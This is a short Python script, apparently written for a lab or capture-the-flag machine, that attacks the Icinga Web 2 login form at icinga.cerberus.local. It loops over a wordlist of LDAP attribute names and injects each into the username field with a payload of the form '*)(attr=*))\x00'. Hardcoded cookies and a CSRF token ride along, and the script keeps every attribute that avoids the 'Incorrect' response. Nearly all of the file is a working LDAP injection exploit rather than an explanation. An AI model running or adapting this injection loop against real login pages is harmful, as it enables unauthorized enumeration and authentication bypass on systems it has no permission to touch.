#!/usr/bin/python3

import requests
import string


'''
Cookie: _chc=1; Icingaweb2=5kcro5us91ukha9ggkpsts85n8; icingaweb2-tzo=7200-1

username=abc&password=aaa&rememberme=0&redirect=&formUID=form_login&CSRFToken=84227172%7Cd683474923df431cec482b11c463397ac45ad93ce4c850aeb15d68d7e9e3d215&btn_submit=Login'''

fields = []

url = 'http://icinga.cerberus.local:8080/icingaweb2/authentication/login'

cookies = {
    '_chc':'1',
    'Icingaweb2':'5kcro5us91ukha9ggkpsts85n8',
    'icingaweb2-tzo':'7200-1',
}

proxies = {
  'http': 'http://127.0.0.1:8080',
}

f = open('ldap_pay.txt', 'r') #Open the wordlists of common attributes
wordl = f.read().split('\n')
f.close()

for i in wordl:
    r = requests.post(url, data = {'username':'*)('+str(i)+'=*))\x00',\
                                    'password':'bla',\
                                        'rememberme':0,\
                                              'redirect':"", 'formUID':'form_login',\
                                                'CSRFToken':'84227172%7Cd683474923df431cec482b11c463397ac45ad93ce4c850aeb15d68d7e9e3d215',\
                                                    'btn_submit':'Login'}, proxies=proxies, cookies=cookies)
    
     
     #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))

    # adjust condition to your own liking
    if 'Incorrect' not in r.text:
        fields.append(str(i))

print(fields)